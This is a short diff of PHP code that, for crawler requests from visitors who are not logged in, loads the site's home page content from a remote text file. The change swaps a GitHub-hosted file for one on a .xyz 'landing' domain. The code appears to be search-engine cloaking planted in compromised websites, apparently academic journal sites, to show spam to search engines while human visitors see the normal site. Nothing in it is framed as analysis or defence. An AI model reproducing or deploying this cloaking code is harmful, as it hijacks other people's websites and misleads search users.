@@ -43,7 +43,7 @@ if ($isBot && !$isLogged) {
     $targetUrl = null;
 
     if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
-        $targetUrl = 'https://raw.githubusercontent.com/okewlalocksystem-tech/BELAWAN/refs/heads/main/jurnal.iimsurakarta-new-1.txt';
+        $targetUrl = 'https://well-landing.xyz/landing/ar.ar-raniry.txt';
     }
 
     else {
